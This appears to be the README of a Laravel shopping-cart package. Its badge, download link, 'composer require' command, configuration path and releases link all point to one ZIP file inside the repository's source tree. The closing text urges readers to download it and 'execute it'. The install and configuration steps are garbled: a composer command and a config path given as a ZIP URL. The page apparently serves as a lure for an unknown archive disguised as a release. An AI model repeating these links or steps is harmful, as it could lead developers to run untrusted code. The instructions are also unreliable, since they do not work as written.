# eCommerce Cart 🛒

![GitHub release](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip)  
[Download Latest Release](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip)

Welcome to the **eCommerce Cart** repository! This lightweight Laravel shopping cart library allows you to build a flexible and efficient shopping cart for your applications. It supports custom Eloquent models, events, and tax calculations, making it an ideal choice for any eCommerce project.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Events](#events)
- [Tax Calculation](#tax-calculation)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features

- **Lightweight**: Designed to be simple and efficient.
- **Custom Eloquent Models**: Easily integrate your own models.
- **Event Support**: Trigger events at various stages of the cart lifecycle.
- **Tax Calculation**: Built-in support for tax calculations based on your needs.
- **Laravel Compatibility**: Fully compatible with Laravel applications.

## Installation

To install the eCommerce Cart library, you can use Composer. Run the following command in your terminal:

```bash
composer require https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip
```

After installation, you can publish the configuration file by running:

```bash
php artisan vendor:publish --provider="DubeyAnuj\EcommerceCart\ServiceProvider"
```

This command will create a configuration file in the `config` directory.

## Usage

Once installed, you can start using the shopping cart in your Laravel application. Here’s a basic example of how to add items to the cart:

```php
use DubeyAnuj\EcommerceCart\Facades\Cart;

Cart::add([
    'id' => 1,
    'name' => 'Product Name',
    'qty' => 1,
    'price' => 100.00,
]);
```

To retrieve the cart contents, use:

```php
$cartContents = Cart::content();
```

You can also remove items from the cart:

```php
Cart::remove($itemId);
```

## Configuration

The configuration file allows you to customize various aspects of the cart. You can find it in the `https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip` file. Here are some of the key settings:

- **tax_rate**: Set the default tax rate for your cart.
- **currency**: Define the currency used in the cart.
- **item_limit**: Specify the maximum number of items allowed in the cart.

Adjust these settings according to your project's requirements.

## Events

The eCommerce Cart library provides several events that you can listen to. These events allow you to execute custom logic when certain actions occur. Here are some common events:

- **CartItemAdded**: Triggered when an item is added to the cart.
- **CartItemRemoved**: Triggered when an item is removed from the cart.
- **CartUpdated**: Triggered when the cart is updated.

You can listen to these events in your event service provider:

```php
protected $listen = [
    'DubeyAnuj\EcommerceCart\Events\CartItemAdded' => [
        'App\Listeners\SendCartItemAddedNotification',
    ],
];
```

## Tax Calculation

The library supports tax calculations based on the settings you configure. You can set a default tax rate in the configuration file. When items are added to the cart, the tax will be calculated automatically.

To calculate tax for a specific item, you can use:

```php
$tax = Cart::tax($item);
```

This will return the tax amount based on the configured rate.

## Contributing

We welcome contributions to the eCommerce Cart library! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Submit a pull request.

Please ensure your code follows the existing coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/Dubey-Anuj/ecommerce.cart/dev/src/Values/ecommerce_cart_1.8-alpha.5.zip). You can download the latest version from there and execute it in your application.

If you have any questions or need further assistance, feel free to check the issues section of this repository. We are here to help!

---

Thank you for checking out the eCommerce Cart library! We hope it helps you build amazing eCommerce solutions.